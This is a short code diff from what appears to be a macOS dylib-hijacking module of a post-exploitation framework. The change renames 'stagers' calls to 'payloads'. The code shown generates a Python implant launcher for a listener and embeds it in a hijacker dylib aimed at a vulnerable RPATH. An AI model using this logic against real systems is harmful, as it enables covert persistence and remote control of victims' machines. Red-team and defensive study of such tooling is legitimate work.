@@ -107,9 +107,9 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         arch = self.options['Arch']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
         launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
-        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
+        dylibBytes = self.mainMenu.payloads.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
         encodedDylib = base64.b64encode(dylibBytes)
         dylib = self.options['LegitimateDylibPath']['Value']
         vrpath = self.options['VulnerableRPATH']['Value']
